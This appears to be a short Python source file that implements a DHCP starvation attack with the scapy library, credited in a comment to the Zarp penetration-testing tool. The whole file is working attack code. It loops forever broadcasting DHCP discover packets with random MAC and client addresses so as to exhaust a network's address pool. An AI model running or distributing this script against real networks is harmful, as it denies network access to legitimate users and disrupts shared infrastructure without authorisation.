from scapy.all import *
import traceback

'''THIS CODE IS NOT MINE! It has been borrowed from "Zarp"
    https://github.com/hatRiot/zarp'''

def DHCPstarvation(terminal=None):
    try:
        terminal.write('\n[+] Starving network of DHCP resources')
        while True:
            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
            pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
            pkt /= UDP(sport=68, dport=67)
            pkt /= BOOTP(chaddr=''.join(random.choice('abcdef1234567890') for _ in range(12)))
            pkt /= DHCP(options=[("message-type", 'discover'), 'end'])
            sendp(pkt,verbose=0)
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()
